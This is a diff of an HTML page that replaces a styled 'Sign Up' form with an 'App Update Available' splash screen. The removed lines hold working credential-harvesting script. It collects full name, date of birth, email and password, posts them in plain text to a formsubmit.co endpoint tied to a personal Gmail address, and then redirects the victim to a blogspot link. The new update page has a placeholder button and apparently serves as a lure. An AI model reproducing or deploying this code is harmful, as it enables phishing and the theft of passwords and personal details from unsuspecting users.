@@ -3,239 +3,209 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sign Up</title>
+    <title>App Update Available</title>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600&display=swap');
-        
-        body { 
+        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap');
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
             font-family: 'Poppins', sans-serif;
-            display: flex; 
-            justify-content: center; 
-            align-items: center; 
-            min-height: 100vh; 
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
             background-color: #0f172a;
-            margin: 0; 
-            color: #f8fafc; 
+            color: #f8fafc;
+            padding: 20px;
+            overflow: hidden;
         }
 
-        .glow-pro-box { 
-            background: #1e293b; 
-            padding: 40px 35px; 
-            border-radius: 16px; 
-            text-align: center; 
-            width: 85%;
-            max-width: 380px; 
+        /* Background Animated Glows */
+        .bg-glow-1 {
+            position: absolute;
+            width: 300px;
+            height: 300px;
+            background: radial-gradient(circle, rgba(56, 189, 248, 0.15) 0%, transparent 70%);
+            top: -50px;
+            left: -50px;
+            z-index: 1;
+        }
+
+        .bg-glow-2 {
+            position: absolute;
+            width: 350px;
+            height: 350px;
+            background: radial-gradient(circle, rgba(129, 140, 248, 0.15) 0%, transparent 70%);
+            bottom: -50px;
+            right: -50px;
+            z-index: 1;
+        }
+
+        /* Main Container */
+        .maintenance-box {
+            background: #1e293b;
+            padding: 40px 30px;
+            border-radius: 24px;
+            text-align: center;
+            width: 100%;
+            max-width: 400px;
+            border: 1px solid rgba(56, 189, 248, 0.25);
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.4), 0 0 25px rgba(56, 189, 248, 0.1);
+            position: relative;
+            z-index: 2;
+            backdrop-filter: blur(10px);
+        }
+
+        /* Illustration / Icon Container */
+        .icon-wrapper {
+            position: relative;
+            width: 100px;
+            height: 100px;
+            margin: 0 auto 30px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: rgba(56, 189, 248, 0.1);
+            border-radius: 50%;
             border: 1px solid rgba(56, 189, 248, 0.3);
-            box-shadow: 0 0 25px rgba(56, 189, 248, 0.12), inset 0 0 10px rgba(56, 189, 248, 0.05);
+            box-shadow: inset 0 0 15px rgba(56, 189, 248, 0.2);
         }
 
-        h2 { 
-            margin-bottom: 5px;
-            font-size: 28px;
+        /* Rocket/Update Icon using CSS */
+        .icon-wrapper::before {
+            content: '🚀';
+            font-size: 45px;
+            animation: float 3s ease-in-out infinite;
+        }
+
+        @keyframes float {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-8px); }
+        }
+
+        .version-tag {
+            display: inline-block;
+            background: rgba(56, 189, 248, 0.15);
+            color: #38bdf8;
+            padding: 6px 16px;
+            border-radius: 20px;
+            font-size: 13px;
             font-weight: 600;
+            margin-bottom: 20px;
+            border: 1px solid rgba(56, 189, 248, 0.2);
+            letter-spacing: 0.5px;
+        }
+
+        h2 {
+            font-size: 26px;
+            font-weight: 700;
+            margin-bottom: 12px;
             background: linear-gradient(to right, #38bdf8, #818cf8);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
+            letter-spacing: -0.5px;
         }
 
         p {
             font-size: 14px;
             color: #94a3b8;
+            line-height: 1.6;
             margin-bottom: 30px;
         }
 
-        .input-group {
+        /* Update Features List */
+        .features-list {
             text-align: left;
-            margin-bottom: 20px;
+            background: rgba(15, 23, 42, 0.4);
+            padding: 18px;
+            border-radius: 14px;
+            margin-bottom: 30px;
+            border: 1px solid rgba(255, 255, 255, 0.05);
         }
 
-        label {
-            display: block;
+        .feature-item {
+            display: flex;
+            align-items: center;
             font-size: 13px;
             color: #cbd5e1;
-            margin-bottom: 8px;
-            font-weight: 500;
-            letter-spacing: 0.5px;
+            margin-bottom: 10px;
         }
 
-        input { 
-            width: 100%; 
-            padding: 14px 15px; 
-            box-sizing: border-box;
-            border: 1px solid #334155; 
-            background: #0f172a; 
-            color: #f8fafc; 
-            font-size: 15px;
-            border-radius: 8px;
-            transition: all 0.3s ease;
-            font-family: 'Poppins', sans-serif;
+        .feature-item:last-child {
+            margin-bottom: 0;
         }
 
-        input:focus {
-            outline: none;
-            border-color: #38bdf8;
-            box-shadow: 0 0 12px rgba(56, 189, 248, 0.3);
+        .feature-item::before {
+            content: '✦';
+            color: #38bdf8;
+            font-weight: bold;
+            margin-right: 10px;
+            font-size: 14px;
         }
 
-        input::placeholder {
-            color: #475569;
-        }
-
-        button { 
-            padding: 15px; 
-            background: linear-gradient(to right, #0284c7, #4f46e5); 
-            color: #ffffff; 
-            border: none; 
-            border-radius: 8px; 
-            cursor: pointer; 
+        /* Primary Action Button */
+        .btn-update {
+            display: block;
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #38bdf8 0%, #6366f1 100%);
+            color: #ffffff;
+            text-decoration: none;
             font-size: 16px;
             font-weight: 600;
-            width: 100%;
-            margin-top: 10px;
+            border-radius: 12px;
+            box-shadow: 0 4px 15px rgba(56, 189, 248, 0.3);
             transition: all 0.3s ease;
-            box-shadow: 0 4px 15px rgba(79, 70, 229, 0.3);
+            border: none;
+            cursor: pointer;
         }
 
-        button:hover {
-            box-shadow: 0 6px 20px rgba(79, 70, 229, 0.5);
-            transform: translateY(-1px);
+        .btn-update:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(56, 189, 248, 0.4);
         }
 
-        button:disabled {
-            background: #334155;
-            box-shadow: none;
-            cursor: not-allowed;
-            color: #94a3b8;
+        .btn-update:active {
+            transform: translateY(1px);
         }
 
-        #loading-screen { 
-            display: none; 
-            text-align: center;
-        }
-        
-        .loader {
-            width: 45px;
-            height: 45px;
-            border-radius: 50%;
-            border: 3px solid #334155;
-            border-top-color: #38bdf8;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 15px;
-            box-shadow: 0 0 15px rgba(56, 189, 248, 0.2);
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+        /* Secondary Info text */
+        .footer-note {
+            font-size: 11px;
+            color: #64748b;
+            margin-top: 15px;
         }
     </style>
 </head>
 <body>
 
-    <div id="loading-screen">
-        <div class="loader"></div>
-        <p style="color: #cbd5e1; font-size: 15px;">Authenticating...</p>
+    <div class="bg-glow-1"></div>
+    <div class="bg-glow-2"></div>
+
+    <div class="maintenance-box">
+        <div class="icon-wrapper"></div>
+        
+        <span class="version-tag">NEW VERSION AVAILABLE</span>
+        
+        <h2>Time for an Upgrade!</h2>
+        
+        <p>A brand new version of the app is ready. Please update now to continue enjoying uninterrupted access and explore the latest features.</p>
+        
+        <div class="features-list">
+            <div class="feature-item">Supercharged performance & speed</div>
+            <div class="feature-item">Brand new UI enhancements</div>
+            <div class="feature-item">Critical security updates & bug fixes</div>
+        </div>
+
+        <a href="#" class="btn-update">Update App Now</a>
+        
+        <div class="footer-note">It only takes a few moments to get the best experience.</div>
     </div>
 
-    <div class="glow-pro-box" id="signup-box">
-        <h2>Create Account</h2>
-        <p>Enter your details to get started</p>
-        
-        <div class="input-group">
-            <label>Full Name</label>
-            <input type="text" id="userFullName" placeholder="" required />
-        </div>
-
-        <div class="input-group">
-            <label>Date of Birth</label>
-            <input 
-                type="text" 
-                id="userDOB" 
-                placeholder="DD/MM/YYYY" 
-                inputmode="numeric"
-                maxlength="10"
-                required 
-            />
-        </div>
-
-        <div class="input-group">
-            <label>Email Address</label>
-            <input type="email" id="userEmail" placeholder="name@example.com" required />
-        </div>
-
-        <div class="input-group">
-            <label>Password</label>
-            <input type="password" id="userPass" placeholder="••••••••" required />
-        </div>
-        
-        <button id="submitBtn" onclick="handleSignup()">Sign Up</button>
-    </div>
-
-    <script>
-        const adminEmail = "mrpinto1433@gmail.com"; 
-        const targetLink = "https://testing14333333.blogspot.com/?m=1"; 
-
-        window.onload = function() {
-            if (localStorage.getItem("app_user_verified") === "true") {
-                showLoading();
-                window.location.href = targetLink;
-            }
-        };
-
-        // DOB Auto Format
-        document.getElementById("userDOB").addEventListener("input", function(e) {
-            let val = e.target.value.replace(/\D/g, "");
-            let formatted = "";
-
-            if (val.length >= 1) formatted = val.substring(0, 2);
-            if (val.length >= 3) formatted += "/" + val.substring(2, 4);
-            if (val.length >= 5) formatted += "/" + val.substring(4, 8);
-
-            e.target.value = formatted;
-        });
-
-        function showLoading() {
-            document.getElementById("signup-box").style.display = "none";
-            document.getElementById("loading-screen").style.display = "block";
-        }
-
-        function handleSignup() {
-            const fullName = document.getElementById("userFullName").value;
-            const dob = document.getElementById("userDOB").value;
-            const email = document.getElementById("userEmail").value;
-            const pass = document.getElementById("userPass").value;
-            const btn = document.getElementById("submitBtn");
-
-            if(!fullName || !dob || !email || !pass) {
-                alert("Please fill all the details to continue!");
-                return;
-            }
-
-            btn.innerText = "Processing...";
-            btn.disabled = true;
-
-            fetch(`https://formsubmit.co/ajax/${adminEmail}`, {
-                method: "POST",
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    "Full Name": fullName,
-                    "Date of Birth": dob,
-                    "Email": email,
-                    "Password": pass,
-                    "_subject": "New App Registration!"
-                })
-            })
-            .then(() => {
-                localStorage.setItem("app_user_verified", "true");
-                showLoading();
-                window.location.href = targetLink;
-            })
-            .catch(() => {
-                alert("Network error! Please check your connection.");
-                btn.innerText = "Sign Up";
-                btn.disabled = false;
-            });
-        }
-    </script>
 </body>
 </html>
